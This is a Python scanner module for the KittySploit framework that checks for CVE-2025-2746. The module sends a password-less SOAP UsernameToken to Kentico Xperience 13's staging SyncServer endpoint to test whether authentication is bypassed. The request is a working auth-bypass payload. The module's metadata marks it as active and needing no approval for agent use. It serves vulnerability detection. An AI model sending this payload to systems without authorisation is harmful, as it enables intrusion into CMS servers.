#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kentico Xperience 13 CMS - Staging Service Authentication Bypass"""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": 'Kentico Xperience 13 CMS - Staging Service Authentication Bypass',
        "description": 'Kentico Staging SyncServer accepts UsernameToken without password (WT-2025-0011).',
        "author": ["KittySploit Team"],
        "severity": 'critical',
        "cve": 'CVE-2025-2746',
        "tags": ['web', 'scanner', 'cve', 'cve2025', 'vuln', 'kentico', 'auth-bypass', 'kev', 'vkev'],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": ['https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0011', 'https://labs.watchtowr.com/bypassing-authentication-like-its-the-90s-pre-auth-rce-chain-s-in-kentico-xperience-cms/', 'https://nvd.nist.gov/vuln/detail/CVE-2025-2746'],
    }

    def run(self):
        token = secrets.token_hex(16)
        soap = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <wsse:UsernameToken>
        <wsse:Username>admin</wsse:Username>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
      <stagingTaskData><![CDATA[<{token}>]]></stagingTaskData>
    </ProcessSynchronizationTaskData>
  </soap:Body>
</soap:Envelope>"""
        r = self.http_request(
            method="POST",
            path="/CMSPages/Staging/SyncServer.asmx",
            headers={
                "Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": "http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData",
                "Accept": "*/*",
            },
            data=soap,
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "xml" not in ctype:
            return False
        if token not in body or "<wsa:Action>" not in body:
            return False
        denied = (
            "Site not running",
            "SyncServer.ErrorLicense",
            "SyncServer.ErrorServiceNotEnabled",
            "Staging service is not enabled on this server",
            "Staging does not work with blank password",
            "Missing X509 certificate token",
            "The security token could not be authenticated or authorized",
        )
        if any(d in body for d in denied):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2025-2746",            reason="Kentico Staging SyncServer accepted unauthenticated UsernameToken",
            path="/CMSPages/Staging/SyncServer.asmx",
            confidence="high",
        )
        return True

